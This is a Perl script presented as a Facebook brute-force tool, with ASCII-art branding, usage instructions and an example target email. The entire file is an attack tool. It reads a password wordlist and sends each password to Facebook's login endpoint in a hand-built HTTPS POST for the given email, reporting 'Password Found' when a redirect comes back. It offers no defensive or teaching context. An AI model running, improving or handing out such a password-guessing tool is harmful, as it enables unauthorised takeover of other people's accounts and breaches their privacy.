#!/usr/bin/perl
use strict;
use Net::SSLeay::Handle;
use Term::ANSIColor;
# use Term::ANSIColor 2.00 qw(:pushpop);

if(!defined($ARGV[0] && $ARGV[1])) {

system('clear');
print colored(['bold red '], '    ___           __        ___                ', "\n");
print colored(['bold red '], '   / _ )______ __/ /____   / _/__  ___________ ', "\n");
print colored(['bold red '], '  / _  / __/ // / __/ -_) / _/ _ \/ __/ __/ -_)', "\n");
print colored(['bold green '], ' /____/_/  \_,_/\__/\__/ /_/ \___/_/  \__/\__/ ', "\n");

print colored(['bold blue '], '    ____             __             __         ', "\n");
print colored(['bold blue '], '   / __/__ ________ / /  ___  ___  / /__       ', "\n");
print colored(['bold blue '], '  / _// _ `/ __/ -_) _ \/ _ \/ _ \/  \'_/       ', "\n");
print colored(['bold cyan '], ' /_/  \_,_/\__/\__/_.__/\___/\___/_/\_\        ', "\n");
print colored(['bold blue '], '                                               ', "\n");
print colored(['bold red '], '                           BY X4PRIV8 V2 T00L  ', "\n");

# print colored(['bold blue '], '------------------------------------------------', "\n");
print colored(['bold green'], '[');
print colored(['bold cyan'], '!');
print colored(['bold green'], '] ');
print colored(['bold cyan'], 'Usage: ');
print colored(['bold black'], '$');
print colored(['bold blue'], "perl ");
print colored(['bold red'], "$0 ");
print colored(['bold green'], "<email> ");
print colored(['bold magenta'], "<wordlist> ", "\n");

print colored(['bold green'], '[');
print colored(['bold cyan'], '!');
print colored(['bold green'], '] ');
print colored(['bold cyan'], 'Example: ');
print colored(['bold black'], '$');
print colored(['bold blue'], "perl ");
print colored(['bold red'], "$0 ");
print colored(['bold green'], "example\@gmail.com ");
print colored(['bold magenta'], "/root/Desktop/wordlist.txt ", "\n");

exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] No such file or directory on $wordlist -_- \n";


while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
# print "[-] $password -> Wrong \n";
print colored(['bold green'], '[');
print colored(['bold cyan'], '-');
print colored(['bold green'], '] ');
print colored(['bold magenta'], "$password");
print colored(['bold yellow'], ' -> ');
print colored(['bold black'], "Wrong \n");

close SSL;
}
else
{
print colored(['bold blue '], "\n=====================================================\n");
print colored(['bold yellow '], ">> ");
print colored(['bold green'], '[');
print colored(['bold red'], '+');
print colored(['bold green'], '] ');
print colored(['bold cyan'], 'Password Found: ');
print colored(['bold green'], "$password");
print colored(['bold blue '], "\n=====================================================\n\n");

close SSL;
exit;
}
}